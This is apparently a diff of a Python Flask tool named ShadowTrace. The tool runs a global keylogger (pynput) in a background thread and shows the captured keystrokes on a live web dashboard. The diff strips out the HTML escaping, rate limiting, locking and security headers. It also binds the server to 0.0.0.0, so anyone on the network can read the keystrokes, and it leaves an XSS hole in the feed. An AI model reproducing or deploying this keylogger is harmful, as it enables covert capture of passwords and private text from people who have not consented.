@@ -1,112 +1,38 @@
-import os
-import sys
-import time
-import html
-import secrets
-import logging
 import threading
-from dotenv import load_dotenv
-from flask import Flask, render_template_string, jsonify, request, make_response
+import logging
+from flask import Flask, render_template_string, jsonify
 from pynput.keyboard import Key, Listener
 
-import werkzeug
-if not hasattr(werkzeug, '__version__'):
-    import importlib.metadata
-    try:
-        werkzeug.__version__ = importlib.metadata.version('werkzeug')
-    except Exception:
-        werkzeug.__version__ = '3.1.3'
-
-load_dotenv()
-
 app = Flask(__name__)
-app.secret_key = os.getenv('SECRET_KEY', secrets.token_hex(32))
-
 log_storage = []
 clean_text = ""
-storage_lock = threading.Lock()
 
 def on_press(key):
-    global clean_text, log_storage
+    global clean_text
     
-    try:
-        raw_key_str = str(key).replace("'", "")
-        key_str = html.escape(raw_key_str)
+    key_str = str(key).replace("'", "")
 
-        with storage_lock:
-            if key == Key.space:
-                clean_text += " "
-                log_storage.append(" ")
-            elif key == Key.enter:
-                clean_text += "\n"
-                log_storage.append("<br>[ENTER]<br>")
-            elif key == Key.backspace:
-                clean_text = clean_text[:-1]
-                log_storage.append(" [⌫] ")
-            elif "Key" in str(key):
-                token = html.escape(str(key).split('.')[1].upper())
-                log_storage.append(f" <span class='special'>[{token}]</span> ")
-            else:
-                clean_text += key_str
-                log_storage.append(key_str)
+    if key == Key.space:
+        clean_text += " "
+        log_storage.append(" ")
+    elif key == Key.enter:
+        clean_text += "\n"
+        log_storage.append("<br>[ENTER]<br>")
+    elif key == Key.backspace:
+        clean_text = clean_text[:-1]
+        log_storage.append(" [⌫] ")
+    elif "Key" in str(key):
+        log_storage.append(f" <span class='special'>[{str(key).split('.')[1].upper()}]</span> ")
+    else:
+        clean_text += key_str
+        log_storage.append(key_str)
 
-            if len(log_storage) > 1000:
-                log_storage.pop(0)
-    except Exception:
-        pass
+    if len(log_storage) > 1000:
+        log_storage.pop(0)
 
 def start_keylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
-
-class RateLimiter:
-    def __init__(self):
-        self.requests = {}
-        self.lock = threading.Lock()
-
-    def is_allowed(self, ip, endpoint, max_requests, window_seconds):
-        now = time.time()
-        key = f"{ip}:{endpoint}"
-        with self.lock:
-            if key not in self.requests:
-                self.requests[key] = []
-            self.requests[key] = [t for t in self.requests[key] if now - t < window_seconds]
-            if len(self.requests[key]) >= max_requests:
-                return False
-            self.requests[key].append(now)
-            return True
-
-limiter = RateLimiter()
-
-def get_client_ip():
-    return request.remote_addr or '127.0.0.1'
-
-@app.after_request
-def add_security_headers(response):
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
-    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=(), payment=()'
-    
-    response.headers['Content-Security-Policy'] = (
-        "default-src 'self'; "
-        "script-src 'self' 'unsafe-inline'; "
-        "style-src 'self' 'unsafe-inline'; "
-        "img-src 'self' data:; "
-        "connect-src 'self'; "
-        "frame-ancestors 'none'; "
-        "form-action 'self';"
-    )
-
-    origin = request.headers.get('Origin')
-    allowed_origin = os.getenv('CORS_ORIGIN', 'http://127.0.0.1:5005')
-    if origin and (origin == allowed_origin or allowed_origin == "*"):
-        response.headers['Access-Control-Allow-Origin'] = origin
-        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
-        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
-
-    return response
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -114,7 +40,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ShadowTrace // Live Telemetry Monitor</title>
+    <title>ShadowTrace // Live Monitor</title>
     <style>
         :root { --bg: #000000; --term: #0f0; --dim: #003300; --white: #fff; }
         body {
@@ -188,7 +114,7 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <div class="header">
-        <div>SHADOW_TRACE v2.0 <span style="font-size:0.8rem; color:#666;">// PORT: {{ port }} [HARDENED]</span></div>
+        <div>SHADOW_TRACE v1.0 <span style="font-size:0.8rem; color:#666;">// PORT: 5005</span></div>
         <div class="status">● RECORDING LIVE</div>
     </div>
 
@@ -202,7 +128,7 @@ HTML_TEMPLATE = """
             </div>
             <div class="panel stat-box">
                 <div class="label">SYSTEM STATUS</div>
-                <div style="color: var(--term); margin-top:10px;">ACTIVE MONITORING [PROTECTED]</div>
+                <div style="color: var(--term); margin-top:10px;">ACTIVE MONITORING</div>
             </div>
             <div class="panel stat-box">
                 <div class="label" style="margin-bottom: 12px;">BUFFER CONTROLS</div>
@@ -217,15 +143,9 @@ HTML_TEMPLATE = """
 
         function fetchLogs() {
             if (isResetting) return;
-            fetch('/update', {
-                headers: { 'Accept': 'application/json' }
-            })
-                .then(response => {
-                    if (!response.ok) return null;
-                    return response.json();
-                })
+            fetch('/update')
+                .then(response => response.json())
                 .then(data => {
-                    if (!data) return;
                     const feed = document.getElementById('live-feed');
                     if (data.logs && data.logs.length > 0) {
                         feed.innerHTML = data.logs.join('');
@@ -240,16 +160,9 @@ HTML_TEMPLATE = """
 
         function resetLogs() {
             isResetting = true;
-            fetch('/reset', { 
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' }
-            })
-                .then(response => {
-                    if (!response.ok) return null;
-                    return response.json();
-                })
+            fetch('/reset', { method: 'POST' })
+                .then(response => response.json())
                 .then(data => {
-                    if (!data) return;
                     document.getElementById('live-feed').innerHTML = '<span style="color:#666;">Waiting for input...</span>';
                     document.getElementById('count').innerText = '0';
                     const toast = document.getElementById('reset-toast');
@@ -273,79 +186,35 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def index():
-    port = os.getenv('PORT', '5005')
-    return render_template_string(HTML_TEMPLATE, port=port)
+    return render_template_string(HTML_TEMPLATE)
 
 @app.route('/update')
 def update():
-    client_ip = get_client_ip()
-    if not limiter.is_allowed(client_ip, 'update', max_requests=120, window_seconds=60):
-        return jsonify({'error': 'Rate limit exceeded on telemetry updates'}), 429
+    return jsonify({
+        'logs': log_storage,
+        'count': len(log_storage)
+    })
 
-    with storage_lock:
-        response_data = {
-            'logs': list(log_storage),
-            'count': len(log_storage)
-        }
-    
-    response = make_response(jsonify(response_data))
-    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
-    return response
-
-@app.route('/reset', methods=['POST'])
+@app.route('/reset', methods=['GET', 'POST'])
 def reset():
-    client_ip = get_client_ip()
-    if not limiter.is_allowed(client_ip, 'reset', max_requests=10, window_seconds=60):
-        return jsonify({'error': 'Rate limit exceeded on buffer reset'}), 429
-
     global clean_text, log_storage
-    with storage_lock:
-        log_storage.clear()
-        clean_text = ""
-
+    log_storage.clear()
+    clean_text = ""
     return jsonify({
         'status': 'success',
         'logs': [],
         'count': 0
     })
 
-@app.errorhandler(400)
-def bad_request(e):
-    return jsonify({'error': 'Bad Request', 'code': 400}), 400
-
-@app.errorhandler(404)
-def not_found(e):
-    return jsonify({'error': 'Not Found', 'code': 404}), 404
-
-@app.errorhandler(405)
-def method_not_allowed(e):
-    return jsonify({'error': 'Method Not Allowed', 'code': 405}), 405
-
-@app.errorhandler(429)
-def too_many_requests(e):
-    return jsonify({'error': 'Too Many Requests', 'code': 429}), 429
-
-@app.errorhandler(500)
-def internal_error(e):
-    return jsonify({'error': 'Internal Server Error', 'code': 500}), 500
-
 if __name__ == '__main__':
-    host = os.getenv('HOST', '127.0.0.1')
-    try:
-        port = int(os.getenv('PORT', 5005))
-    except ValueError:
-        port = 5005
-
     print("---------------------------------------------")
-    print("   SHADOW_TRACE INITIALIZED [HARDENED]      ")
-    print(f"   1. Keylogger running in background...    ")
-    print(f"   2. Web Interface running on {host}:{port}")
-    print("   3. XSS Filtering & Security Headers: ON  ")
-    print("   4. Rate Limiting: ACTIVE                 ")
+    print("   SHADOW_TRACE INITIALIZED")
+    print("   1. Keylogger running in background...")
+    print("   2. Web Interface running on Port 5005")
     print("---------------------------------------------")
 
     logger_thread = threading.Thread(target=start_keylogger)
     logger_thread.daemon = True 
     logger_thread.start()
 
-    app.run(host=host, port=port, debug=False)
+    app.run(host='0.0.0.0', port=5005, debug=False)
